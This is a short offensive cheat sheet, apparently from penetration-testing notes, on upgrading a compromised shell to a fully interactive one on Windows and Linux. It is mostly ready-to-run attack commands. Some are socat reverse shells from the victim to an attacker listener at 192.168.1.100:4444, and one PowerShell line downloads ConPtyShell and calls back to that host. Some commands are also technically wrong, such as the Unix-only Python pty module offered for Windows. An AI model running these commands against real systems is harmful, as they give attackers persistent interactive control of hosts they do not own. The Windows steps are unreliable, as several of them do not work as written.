When an attacker gains a basic shell (e.g. via netcat, a web shell, or reverse shell), it often lacks essential features like tab completion, history, job control, and a proper TTY. Upgrading the shell makes it more interactive, resilient and user friendly.
# Windows
## Spawn cmd.exe properly by executing the following from the shell
```shell
cmd.exe
```
## Upgrading to a PowerShell prompt
```shell
powershell -ep bypass
```
```PowerShell
powershell -NoProfile -ExecutionPolicy Bypass
```
## Using stty-like functionality with ConPTY
	- Windows has ConPTY (Psuedoconsole API) which allows upgrading dumb shells. use nc or socat with ConPTY support through the following commands:
```shell
python3 -c "import pty; pty.spawn(['powershell'])"
```
```shell
C:\Windows\System32\conhost.exe cmd.exe
```
## Interactive reverse shell (with ConPTY)
```PowerShell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/InvokeConPtyShell.ps1')
```
```PowerShell
Invoke-conPtyShell 192.168.1.100 4444
```
## Windows reverse shell upgrade with socat
- If you have socat installed you can establish a fully interactive shell:
- On the victim machine run
```PowerShell
socat EXEC:'cmd.exe',pty,stderr TCP:192.168.1.100:4444
```
- Then on the attacker machine
```bash
socat -d -d TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```
# Linux
## Using Python to spawn a TTY shell
- If python is available run one of the following:
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```
```bash
python -c "import pty; pty.spawn('/bin/bash')"
```
## Exporting environment variables for a better shell by imprving a TTY shell with 
```bash
export TERM=xterm
```
```bash
stty rows 40 cols 100
```
## Using script for a full TTY
```bash
script /dev/null -c bash
```
## Using socat for a full shell
- Start a listener on your attacker machine with 
```bash
socat -d -d TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```
- Then run the following on the compromised machine to get a full TTY shell with job control
```bash
socat TCP:192.168.1.100:4444 EXEC:"bash -li",pty,stderr,sigint,sane
```

